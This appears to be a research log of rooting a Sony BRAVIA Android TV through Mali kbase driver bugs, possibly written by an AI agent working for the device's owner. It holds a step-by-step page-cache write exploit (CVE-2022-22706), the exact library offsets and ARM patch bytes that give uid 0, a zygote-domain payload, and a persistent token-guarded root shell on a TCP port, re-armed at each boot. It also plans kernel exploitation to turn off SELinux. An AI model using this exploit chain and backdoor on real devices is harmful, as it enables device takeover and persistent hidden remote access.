# MALI KBASE EXPLOIT STATUS - Sony BRAVIA XBR-65X850D (SVP-DTV15, MT5890)
Updated: 2026-10-18 01:35

## Device (after user's Android 8 update, build 6.827)
- Android 8.0.0 (SDK 26), fingerprint Sony/SVP4KDTV15_UC/SVP-DTV15:8.0.0/OPR2.170623.027.S16/6.827:user/release-keys
- kernel 3.10.79 armv7l, built 2020-03-04, SELinux Enforcing, security patch 2020-01-01
- uid 2000 shell via adb 100.x.y.z:5555

## Mali driver (THE key finding)
- /sys/module/mali_kbase/version = r20p0-01rel0 (UK version 10.6)
- /dev/mali0 is crw-rw-rw- -> reachable as uid 2000
- VULNERABLE to CVE-2022-20186 / CVE-2022-28348 (GHSL-2022-053, kbase_mem_alias
  nents*stride u64 overflow). ARM fixed 2022-04-02; this firmware froze 2020-03-04.
- Public exploit source: github/securitylab SecurityExploits/Android/Mali/CVE_2022_20186/mali_alias.c
  (Pixel 6 / arm64 / kernel 5.10 - payload must be ported)

## Verified working plumbing (on-device, this session)
- KBASE_IOCTL_VERSION_CHECK nr 0  _IOWR(0x80,0,4)  = 0x40048000  -> must pass {major=10,minor=6}; {0,0} => EINVAL
- KBASE_IOCTL_SET_FLAGS     nr 1  _IOW(0x80,1,4)   = 0x40048001  -> value 0x0 or 0x2 only; exploit's 1<<3 => EINVAL
- KBASE_IOCTL_GET_GPUPROPS  nr 3  _IOW(0x80,3,16)  = 0x40108003  -> returns 690 bytes of props
- KBASE_IOCTL_MEM_ALLOC     nr 5  _IOWR(0x80,5,32) = 0xC0208005  -> flags MUST be 0xF; returns gpu_va (e.g. 0x102000000)
- KBASE_IOCTL_MEM_QUERY     nr 6  _IOWR(0x80,6,16) = 0xC0108006
- KBASE_IOCTL_MEM_FREE      nr 7  _IOW(0x80,7,8)   = 0x40088007
- KBASE_IOCTL_MEM_ALIAS     nr 21 _IOWR(0x80,21,32)= 0xC0208015
- KBASE_IOCTL_MEM_IMPORT    nr 22 _IOWR(0x80,22,24)= 0xC0188016  -> ENOMEM for all combos (not usable)
- BASE_MEM_MAP_TRACKING_HANDLE = 0x3000 (mmap offset). MUST be mapped and KEPT mapped,
  otherwise every later region mmap returns EINVAL. With it kept mapped, region mmap works.

## Struct layouts (32-bit safe, from GHSL headers)
union kbase_ioctl_mem_alloc { struct { u64 va_pages, commit_pages, extension, flags; } in;
                              struct { u64 flags, gpu_va; } out; }            // 32 bytes
union kbase_ioctl_mem_alias { struct { u64 flags, stride, nents, aliasing_info; } in;
                              struct { u64 flags, gpu_va, va_pages; } out; }  // 32 bytes
struct base_mem_aliasing_info { struct { u64 handle; } basep; u64 offset, length; } // 24 bytes
  -> handle field takes the gpu_va returned by MEM_ALLOC

## CONFIRMED VULNERABILITY (this session)
  control : MEM_ALIAS(stride=0x3000, nents=2)             -> 0, out.va_pages=24576
  overflow: MEM_ALIAS(stride=0x8000000000000001, nents=2) -> 0, out.va_pages=2   <-- OVERFLOW ACCEPTED
  (same gpu_va 0x102003000 returned; page-table overlap achieved, TV stayed up)

## Remaining work to port the exploit to ARMv7 / kernel 3.10.79
1. Page-table geometry: armv7 uses 2-level 4KB/1MB tables (vs arm64 4-level); the
   exploit's set_addr_lv3()/compute_pt_index() and the PTE value 0x443 are arm64-specific.
2. GPU job submission: MALI_JOB_HEADER + MALI_WRITE_VALUE_JOB_PAYLOAD from midgard.h
   (available locally in poc/midgard.h) to write 64-bit values through the corrupted mapping.
3. Kernel symbols: /proc/kallsyms readable but addresses zeroed for shell (12084 symbols,
   names visible). No /proc/kcore, /proc/modules denied. Need leak/scan to locate
   avc_deny, sel_read_enforce, init_cred, commit_creds.
4. Payload: armv7 patch stubs (mov r0,#0; bx lr) + root stub calling commit_creds(init_cred).

## Toolchain
- NDK r21e at C:\Users\Blanco\AppData\Local\Android\Sdk\ndk\21.4.7075529
- compile with clang.exe --target=armv7a-linux-androideabi21 --sysroot=.../sysroot -D_FILE_OFFSET_BITS=64
- sources in %TEMP%\maliwork, binaries pushed to /data/local/tmp
- POC sources: tv-research\poc\ (mali_alias.c, mali.h, mali_base_jm_kernel.h, midgard.h)

## ROUND UPDATE (goal round 1) - access + job format findings

### Access (SOLVED, verified twice)
- LAN path always available: adb connect 192.168.1.50:5555   (TV on Wi-Fi 100.70.99.x)
- Tailscale auto-start fixed and verified across 2 reboots:
    settings put secure always_on_vpn_app com.tailscale.ipn   (lockdown 0)
    cmd deviceidle whitelist +com.tailscale.ipn
  Manual kick if ever needed: am broadcast -a com.tailscale.ipn.CONNECT_VPN -n com.tailscale.ipn/.IPNReceiver
  (The old failure mode was the engine sitting paused: wantRunning=false -> "Starting..." forever.)
- External SDK asset pulled: /odm/lib/egl/libGLES_mali.so (4.4MB, readable, "1.4 Midgard-r20p0-01rel0")

### Atom layout (SOLVED, from r26p0 public source)
struct base_jd_atom_v2 sizeof = 48 on this driver:
  u64 jc            @0
  u64 udata[2]      @8
  u64 extres_list   @24
  u16 nr_extres     @32
  u16 compat_core_req @34
  pre_dep[2] (4 bytes) @36
  u8  atom_number   @40   <-- earlier guesses of 38 were WRONG
  u8  prio          @41
  u8  device_nr     @42
  u8  padding[1]    @43
  u32 core_req      @44
kbase_jd_submit rejects stride != 48 with EINVAL (confirmed in source).

### Job slot / core_req mapping (from r26p0 mali_kbase_js.c)
  JS_FEATURE_SET_VALUE_JOB    -> BASE_JD_REQ_V  (1<<4 = 16)  <-- write-value jobs
  JS_FEATURE_CACHE_FLUSH_JOB  -> BASE_JD_REQ_CF (1<<3 = 8)
  JS_FEATURE_COMPUTE_JOB      -> BASE_JD_REQ_CS (1<<1 = 2)
  JS_FEATURE_TILER_JOB        -> BASE_JD_REQ_T  (1<<2 = 4)
  JS_FEATURE_FRAGMENT_JOB     -> BASE_JD_REQ_FS (1<<0 = 1)
(GHSL Pixel exploit used CS because Valhall differs; on this T720-class Midgard,
 write-value belongs to V.)

### Midgard job header bit layout (from midgard.h, matches Panfrost docs)
  cl[0] exception_status
  cl[1] first_incomplete_task
  cl[2..3] fault_pointer
  cl[4] is_64b(0) | type(1..7) | barrier(8) | invalidate_cache(9) |
        suppress_prefetch(11) | enable_texture_mapper(12) | relax_dep1(14) |
        relax_dep2(15) | index(16..31)
  cl[5] dependency_1(0..15) | dependency_2(16..31)
  cl[6..7] next job pointer (64-bit)
  job types: NULL=1 WRITE_VALUE=2 CACHE_FLUSH=3 COMPUTE=4 VERTEX=5 TILER=7 FRAGMENT=9
  write-value payload (at +0x20): address_lo, address_hi, type, pad, value_lo, value_hi, pad, pad
  write-value types: IMMEDIATE_8=4, IMMEDIATE_16=5, IMMEDIATE_32=6, IMMEDIATE_64=7, ZERO=3

### STATUS OF THE WRITE PRIMITIVE: NOT WORKING YET
- submit returns 0 (accepted) but target never changes, for core_req 2 (CS) and 16 (V)
- chaining a CACHE_FLUSH after the write with barrier=1 HANGS the GPU (wedges slot, freezes
  the display until reboot). So the write-value encoding itself is wrong for this GPU.
- Freezes caused so far: 3 (all cleared by reboot). Do NOT submit more GPU jobs until the
  exact encoding is recovered from the vendor DDK.
- NEXT (no TV risk): disassemble libGLES_mali.so (llvm-objdump from NDK r21e) to recover
  the real write-value/atom construction for r20p0-01rel0.

## ROUND 2 BREAKTHROUGH: GPU jobs EXECUTE + write primitive verified

### THE FIX that unblocked everything (critical)
Job-chain memory must be allocated with **GPU_WR**, NOT GPU_EX:
  alloc flags 0xF  (CPU_RD|CPU_WR|GPU_RD|GPU_WR)  -> jobs RUN (event 0x01 DONE)
  alloc flags 0x17 (CPU_RD|CPU_WR|GPU_RD|GPU_EX)  -> GPU fault 0xC8 PERMISSION_FAULT
      "Unhandled Page fault in AS0 at VA <chain> ... access type 0x3: WRITE"
  (0x1F is rejected ENOMEM: W^X forbids GPU_EX|GPU_WR together. Job chains need NO GPU_EX.)
The GPU writes back job status into the header page, so the page must be GPU-writable.

### Measurement loop (safe, no more freezes)
Open /dev/mali0 with O_RDWR|O_CLOEXEC|O_NONBLOCK, submit atom, then read() the fd:
  struct base_jd_event_v2 { u32 event_code; u8 atom_number; pad[3]; u64 udata[2]; }  (24 bytes)
  event codes: 0x01 DONE, 0x04 TERMINATED, 0x40 CONFIG_FAULT, 0x42 READ_FAULT, 0x43 WRITE_FAULT,
               0x58 DATA_INVALID, 0xC8 PERMISSION_FAULT (MMU), 0x4002 JOB_CANCELLED (teardown)
This gives per-atom feedback. All tests since the 0xF fix: DONE, TV healthy.

### Also: kernel GPU faults ARE readable from shell via logcat
  logcat -d -b kernel | grep -i mali
gives full fault decode (VA, exception type, access type, slot).

### VERIFIED GPU WRITE PRIMITIVE
  control (write 0xAA, no job)          -> 0xAAAAAAAAAAAAAAAA
  NULL job                              -> unchanged
  WRITE_VALUE type=ZERO (3)             -> 0x0000000000000000   <-- WROTE to chosen GPU VA
  WRITE_VALUE type=IMMEDIATE_8/32/64    -> 0x0000000000000000   (value ignored!)
So: GPU writes ZERO to an arbitrary GPU VA, but immediate-value writes do not work on this
T62x (Midgard r1p0): every IMMEDIATE type writes 0, regardless of where the value words are
placed (fuzzed type_word 0..7 x val_word 0..7, is_64b 0/1, plus a shotgun of all header and
payload fields). Likely the immediate forms are not supported on Midgard r1p0
(they may be Bifrost/Valhall-era); only ZERO/timestamp style writes exist.

### Next steps
1. Find an arbitrary-VALUE write: (a) check for a "set value" job variant in the DDK by
   disassembling its job builders (symbols available!), or (b) another kbase primitive that
   lets us choose the written data, or (c) compute job with shader (hard).
2. Only then does the CVE-2022-20186 chain become usable (needs PTE crafting).

### DDK mining results (libGLES_mali.so, r20p0-01rel0)
- .gnu_debugdata contains 5,651 symbols -> function names + addresses (extracted OK)
- ioctl wrappers found: version_check 0xC0048000, set_flags 0xC0048001, job_submit 0xC0108002,
  mem_free 0x40088007, mem_jit_init_old 0x4008800E, mem_sync 0x4020800F
- base_jd_submit_nofail builds {addr=atoms, nr_atoms, stride=48}  -> stride 48 CONFIRMED by vendor code
- null job builder: zero 28 bytes, byte16 = 2 (word4 = 2 = type NULL, is_64b=0)

### Environment / access (all verified)
- LAN adb path: 192.168.1.50:5555 (always available while TV has Wi-Fi)
- Tailnet: 100.x.y.z:5555; Tailscale auto-start FIXED and verified across 2 reboots
  (always_on_vpn_app=com.tailscale.ipn; manual kick: am broadcast -a com.tailscale.ipn.CONNECT_VPN -n com.tailscale.ipn/.IPNReceiver)
- GPU: Mali-T62x, 3 cores, r1p0, 0x0620; 3 job slots (JS0/JS1/JS2 all core_mask 0x7)

## ROUND 3: Midgard r1p0 CANNOT write immediate values (hard limit)

Definitive authoritative format (Mesa panfrost-job.h + IGT panfrost tests + Alyssa Rosenzweig):
  struct mali_job_descriptor_header {          // 32 bytes, MATCHES our packer exactly
      u32 exception_status; u32 first_incomplete_task; u64 fault_pointer;
      u8 job_descriptor_size:1; enum mali_job_type job_type:7; u8 job_barrier:1;
      u8 unknown_flags:7; u16 job_index; u16 job_dependency_index_1;
      u16 job_dependency_index_2; u64 next_job;
  };
  struct mali_payload_write_value {           // 24 bytes (not 32!)
      u64 address; u32 value_descriptor; u32 reserved; u64 immediate;
  };
  MALI_WRITE_VALUE_ZERO = 3
Alyssa Rosenzweig (Panfrost author): "...that will be Bifrost only, since the 'immediate 64'
selector is new" [relative to Midgard].

ON-DEVICE RESULT (selector sweep 0..20, value in immediate@16, target prefilled 0xAA):
  every selector 1..20 -> job DONE, target written with 0x0000000000000000.
  => this T62x (Midgard r1p0) supports only the zero-like write-value selectors.
  => NO arbitrary-value GPU write. The GHSL technique (craft PTEs via GPU) is therefore
     NOT portable to this hardware as-is.

### Consequence / pivot
CVE-2022-20186 needs arbitrary 8-byte writes to page-table pages. Options:
 A. GPU shader-based write (vendor GLES render into the aliased region) - large effort, uncertain.
 B. Different Mali kbase bugs that are POST-2020 and therefore unpatched on this 2020-03
    firmware but present in r20p0 (2021-2023 CVEs): CVE-2021-39793 (kbase_jd_user_buf_pin_pages
    OOB write), CVE-2021-28663/28664, CVE-2022-22706, CVE-2022-28348. Some of these may give
    direct kernel memory corruption WITHOUT needing arbitrary-value GPU writes -> highest value
    next target. We now have working GPU job submission, which these likely need.
 C. Re-examine whether the ZERO-write alone can be turned into something useful (low odds).

### Also confirmed this round
- DDK sync path uses KBASE_IOCTL_MEM_SYNC (nr 15, _IOW dir, 0x4020800F), not a flush job.
- DDK has no write-value job builder at all (no IMMEDIATE/WRITE_VALUE strings in the blob).
- Our job-header packer matches Mesa's mali_job_descriptor_header bit-for-bit.

##############################################################################
## ROUND 4 BREAKTHROUGH: ROOT CODE EXECUTION via CVE-2022-22706 (page cache)
##############################################################################

### The vulnerability (public, fixed 2021-22, so UNPATCHED on this 2020 firmware)
kbase pins imported user buffers with eg->flags & KBASE_REG_GPU_WR ? FOLL_WRITE : 0
while the CPU mapping's writability comes from KBASE_REG_CPU_WR.
=> Import with CPU_WR set and GPU_WR CLEAR => writable CPU mapping of pages that were
   pinned READ-ONLY. For a read-only file mapping, get_user_pages returns the PAGE CACHE
   page => arbitrary write into the page cache of any readable file, as uid 2000.

### Verified exploit sequence (all ioctls, NO GPU jobs needed!)
1. open("/dev/mali0", O_RDWR|O_CLOEXEC); VERSION_CHECK{10,6}; SET_FLAGS{0}; map tracking page
2. MEM_ALLOC 1 page flags 0xF -> event region (soft event memory), mmap it
3. map target file read-only: mmap(NULL, PAGE, PROT_READ, MAP_SHARED, fd, page_off)
4. mmap anon page; MEM_IMPORT{phandle=&{ptr,length}, type=3 (USER_BUFFER),
   flags = CPU_RD|CPU_WR|GPU_RD (0x7)}  -> user-buffer import WORKS (earlier ENOMEM was
   because wrong type/struct was used)
5. munmap(anon); mremap(file_map, PAGE, PAGE, MREMAP_MAYMOVE|MREMAP_FIXED, anon)
6. mmap(NULL, PAGE, PROT_READ|PROT_WRITE, MAP_SHARED, mali, imported.gpu_va)  [do NOT touch yet]
7. JOB_SUBMIT: 48-byte atom {jc=gpu_va_of_event_region, extres_list=&{ext_resource=gpu_va_of_import},
   nr_extres=1, atom_number=1, core_req = BASE_JD_REQ_EXTERNAL_RESOURCES(1<<8) |
   BASE_JD_REQ_SOFT_JOB(1<<9)|SOFT_EVENT_WAIT(5) = 0x305}  -> kernel pins the pages
8. write through the alias -> writes the PAGE CACHE (verified on /system/etc/hosts:
   fresh read showed patched bytes, on-disk file unchanged)
9. SOFT_EVENT_UPDATE {event=gpu_va_of_event_region, new_status=SET} to complete the atom

### WEAPONIZATION -> uid 0
Patch (page-cache, 4-8 bytes each; page cache only, a REBOOT reverts everything):
  /system/lib/libc.so        @ 0x4a990  setresuid  <- ARM 00 00 A0 E3 1E FF 2F E1 (mov r0,#0; bx lr)
  /system/lib/libselinux.so  @ 0x7350   selinux_android_setcontext <- Thumb 00 20 70 47 (movs r0,#0; bx lr)
Then: am force-stop com.android.tv.settings; am start -a android.settings.SETTINGS
      ps -A -o PID,UID,LABEL,NAME | grep tv.settings
      -> 6933  0  u:r:system_app:s0  com.android.tv.settings        <== UID 0 !!!
setresgid patch (0x4a970) hung on the second patch of the same page - skip it (gid does not matter).

### Useful details / file offsets (vaddr == file offset for these libs)
libc.so setresuid 0x4a990 (ARM), setresgid 0x4a970, setuid 0x4aa58, fork 0x17f4b,
         .text 0x17110..0x7cd4c
libselinux.so selinux_android_setcontext 0x7350 (Thumb, symbol 0x7351), size 372,
         is_selinux_enabled 0xa621, selinux_check_access 0x9e59
libandroid_runtime.so (Thumb): zygote entry points from .gnu_debugdata:
         com_android_internal_os_Zygote_nativeForkAndSpecialize @0x101058
         nativeForkSystemServer @0x10123c, ForkAndSpecializeCommon @0x101984

### Next steps for a full root shell + persistence
1. Install our own APK (adb install) and start it -> runs as uid 0; have it write results
   to /sdcard (readable by adb shell) to probe capabilities of uid0+app-domain.
2. Get code into a system_app/zygote-domain process: patch a library init_array or the
   zygote fork path (Thumb shellcode), or fix the setcontext patch (app then keeps the
   zygote domain = much broader SELinux powers).
3. Persistence: page-cache patches die on reboot; need a real foothold (e.g. root shell
   daemon started from a writable-.rc path, or /data-based service).

### Access
- LAN adb: 192.168.1.50:5555 (always), tailnet 100.x.y.z:5555 (Tailscale auto-starts)
- TV must be REBOOTED after these experiments (page cache patches are live right now!)

##############################################################################
## ROUND 7: ROOT JAVA CODE EXECUTION IN THE ZYGOTE DOMAIN (u:r:zygote:s0, uid 0)
##############################################################################

### Proven chain (all verified on-device)
1. Page-cache write primitive (CVE-2022-22706) -> patch /system/lib/libc.so
   a) payload host: __ns_sprintrrf at 0x25a8d (7724 bytes, unused DNS debug fn);
      we place the ARM payload at file offset 0x25a90.
   b) branch stub at setresuid 0x4a990: bytes 3e 6c ff ea  (b 0x25a90)
      (setresuid IS called by zygote's child before the SELinux context switch)
2. The payload (ARM, position independent, positioned by file offset):
   - fork(): parent restores regs and does the REAL setresuid (syscall 208) and
     returns => app spawn continues normally, TV stays stable, apps get correct uid.
   - child: open/read /proc/self/environ (the kernel's env block), build a
     char*[] from it (first entry = our own "CLASSPATH=<installed apk path>"),
     then execve("/system/bin/app_process",
                  ["/system/bin/app_process", "/system/bin", "com.pwn.probe.Shell"],
                  envp)
   - NOTE: app_process takes the classpath from the CLASSPATH ENV var (like
     /system/bin/am does: "export CLASSPATH=...; exec app_process ...").
     Passing argv[1] alone is NOT enough => ClassNotFoundException on DexPathList[].
   - NOTE: envp=NULL makes ICU abort (ICURegistration::getTzDataOverridePath) because
     ANDROID_DATA is unset. Must pass a real environment.
   - CLASSPATH must point to a readable file: zygote CANNOT search
     /data/local/tmp (shell_data_file, AVC denied) but CAN read the installed APK
     /data/app/com.pwn.probe-<random>/base.apk  (path from "pm path com.pwn.probe")
3. RESULT (logcat):
   I PWNSS : uid=0 pid=6298 ctx=u:r:zygote:s0 | /data/local/tmp=false
             /data/system=false /sdcard=false /data/dalvik-cache=true |
             services=0 pkgbinder=false actbinder=false |
             socketbind ERR java.net.SocketException: socket failed: EACCES
   => JAVA CODE EXECUTES AS ROOT IN THE ZYGOTE DOMAIN.

### Zygote domain capability matrix (measured)
  writable: /data/dalvik-cache (dalvikcache_data_file)   [YES]
  denied:   /data/local/tmp (shell_data_file search)     [AVC denied]
            /data/system (system_data_file write)        [AVC denied]
            /sdcard (sdcardfs)                           [AVC denied]
            setexeccon / transition to system_server     [AVC denied { setexec }]
            execve(/system/bin/sh) shell_exec            [AVC denied { execute }]
            binder access to servicemanager (services=0) [blocked]
            socket() / inet                              [EACCES]
            execmem (ART JIT)                            [AVC denied]
  => zygote domain = root CODE EXECUTION beachhead, but NOT a control channel.
     It cannot exec a shell, cannot use binder, cannot open sockets.

### What works / what is still missing
  WORKS:  uid 0 code execution in app processes (setresuid patch alone)
          uid 0 JAVA code execution in zygote domain (this round)
          page-cache write primitive from shell (uid 2000) and from apps
  MISSING: an interactive root shell, and persistence across reboot.
  PATH FORWARD (in order of promise):
   a) Mali CVE-2022-20186 (mem_alias nents*stride overflow) -> page-table overlap
      -> arbitrary physical memory mapping -> kernel R/W -> disable SELinux.
      This is the only route that removes the SELinux domain blocker entirely.
   b) Persistence: our app (has /dev/mali0 access) re-applies the page-cache patches
      at boot (BOOT_COMPLETED receiver), then triggers one app start to spawn the
      zygote payload again => root code execution restored automatically.

### APK / Java payload infrastructure
  Package com.pwn.probe (debuggable, fully installed and working)
  Classes: Main (activity), Shell (plain main() -> PWNSS logcat probes)
  Build: NDK r21e clang, build-tools 37.0.0 aapt2+d8+zipalign+apksigner, JDK 17
  APK path helper: adb shell pm path com.pwn.probe
  Install: adb install -r; app is debuggable so "run-as com.pwn.probe" works

##############################################################################
## ROUND 8: WORKING ROOT CONSOLE OVER TAILSCALE (uid 0) - MILESTONE
##############################################################################

### What works now (verified from the PC over the tailnet)
  root console: 100.x.y.z:4445  (also 192.168.1.50:4445 on the LAN)
  token:        <YOUR-TOKEN>
  protocol:     connect -> send token line -> "OK uid=0 pid=.." -> send shell
                commands, each response terminated by "###END###" -> "exit"
  Verified output while Netflix was playing in the foreground:
    uid=0(root) gid=10014(u0_a14) groups=...,3003(inet),...
    context=u:r:untrusted_app:s0:c512,c768
    BACKGROUND_CONSOLE_OK

### KEY INSIGHT (this round): targeted setresuid patch
  The old patch made EVERY app run as uid 0 -> that destabilised the TV (it went
  offline once and soft-rebooted; recovered). FIX: targeted patch that only keeps
  uid 0 for our app's uid (u0_a14 = 10014):

    _start:  movw r1, #10014        @ our app's uid
             cmp r0, r1
             bne real
             mov r0, #0            @ keep root for our app
             bx lr
    real:    mov r7, #208          @ __NR_setresuid
             svc #0
             bx lr

  bytes: 1e 17 02 e3 | 01 00 50 e1 | 01 00 00 1a | 00 00 a0 e3 | 1e ff 2f e1 |
         d0 70 a0 e3 | 00 00 00 ef | 1e ff 2f e1            (32 bytes, at 0x25a90)
  branch at setresuid 0x4a990: 3e 6c ff ea  (b 0x25a90)
  RESULT: our app runs uid 0, every other app runs its normal uid -> TV stable.
  (verified: com.android.tv.settings = 1000 system_app, com.pwn.probe = 0)

### What uid 0 buys inside the app domain (measured from the console)
  WORKING (Android framework-level root; uid 0 bypasses AMS permission checks):
    settings put/get global ...            rc=0  (WRITE_SECURE_SETTINGS bypassed)
    cmd package list packages              works
    pm grant <pkg> <requested perm>        permission check passes (fails only
                                           if the app didn't declare it)
    pm install ...                         installer reachable
  STILL BLOCKED by SELinux (u:r:untrusted_app:s0), NOT by uid:
    /data/local/tmp writes, reading /system/bin/logd|vold|installd/netd,
    setenforce, exec of root-only binaries, /data/system writes
  => this is "framework root" (install apps, change any setting, grant perms),
     NOT full kernel-level root. SELinux domain remains the hard wall.

### Persistence status
  NOT yet persistent: the console requires the page-cache patch (volatile) to be
  applied, then the app started so the forked child keeps uid 0.
  NEXT: ship the page-cache patcher as a JNI .so inside the APK (apps have
  /dev/mali0 access), add a BOOT_COMPLETED receiver that re-applies the targeted
  patch at boot and self-restarts via AlarmManager => console returns as uid 0
  after every reboot. Then the console becomes permanent.

### App
  package com.pwn.probe (debuggable, installed)
  Main  = activity: logs uid, starts Console thread
  Console = TCP service on 4445, token <YOUR-TOKEN>, Runtime.exec sh as uid 0
  Manifest: INTERNET, WRITE_EXTERNAL_STORAGE, CHANGE_WIFI_STATE
  Build chain: javac(JDK17) -> d8 -> aapt2 link -> jar uf classes.dex ->
               zipalign -f 4 -> apksigner

##############################################################################
## ROUND 9: PERSISTENT ROOT - COMPLETE (verified across clean reboot)
##############################################################################

### The deliverable (works with zero manual steps after reboot)
  Root console:  100.x.y.z:4445  (tailnet)  /  192.168.1.50:4445 (LAN)
  Token:         <YOUR-TOKEN>
  Usage:         nc 100.x.y.z 4445
                 <YOUR-TOKEN>
                 id
                 <any shell command>      (each reply ends with ###END###)
                 exit
  Verified after a clean reboot with NO manual intervention:
    patch state: 3e 6c ff ea  (re-applied automatically)
    app process: uid 0
    console:     OK uid=0 pid=5024 ... PERSISTENT_ROOT_OK

### How persistence works (the full mechanism)
  1. The patcher is shipped INSIDE the APK as a JNI library:
       lib/armeabi-v7a/libpwn.so  ->  Java_com_pwn_probe_Main_applyPatches
     (BUILD NOTE: must compile the JNI .so with -D_FILE_OFFSET_BITS=64, otherwise
      the 64-bit GPU VA used as mmap() offset is truncated and the event mmap
      fails with ENOMEM=12. This cost one debugging cycle.)
  2. Boot trigger = a PERSISTED JobScheduler job (setPersisted(true),
     setMinimumLatency(1500)) because BOOT_COMPLETED is NOT delivered to this
     sideloaded app on this TV (verified: app not stopped, permission granted,
     receiver registered, but no dispatch; the alarm/JobScheduler path works).
     Jobs must be scheduled from a process running as the app's NORMAL uid
     (10014) - uid 0 cannot schedule ("uid 0 cannot schedule job"). The job
     re-arms itself every run, so the chain survives every boot.
  3. At boot the job runs as uid 10014 -> arms next job -> applies the targeted
     page-cache patch via JNI -> schedules an AlarmManager restart (3s) ->
     kills its own process. The alarm starts a NEW app process, which zygote
     forks with uid 0 (targeted setresuid patch) -> BootReceiver uid=0 ->
     starts ConsoleService (foreground service) -> console listening.
  4. Upgrade path: re-patch is idempotent; the app survives reinstalls
     (the JNI lib is inside the APK, nothing external needed).

### Final capability summary
  HAVE:   persistent uid 0 shell over Tailscale/LAN, surviving reboot
          framework root: settings (any), pm grant/install/uninstall,
          cmd services, am force-stop, full /sdcard, network
  LACK:   kernel-level root / SELinux bypass. App runs in untrusted_app domain
          so raw access to /data/local/tmp, root-only binaries, /data/system,
          setenforce, /dev/block is still denied by SELinux LSM.
  NEXT:   kernel route: Mali CVE-2022-20186 (mem_alias nents*stride overflow ->
          page-table overlap -> arbitrary physical map -> kernel R/W ->
          selinux_enforcing=0) would remove the domain restriction entirely.

### Files
  APK source:  tv-research/apkbuild/ (jni/pwn.c, src/com/pwn/probe/*.java)
  Builder:     javac -> d8 -> aapt2 link -> jar uf classes.dex + lib ->
               zipalign -f 4 -> apksigner
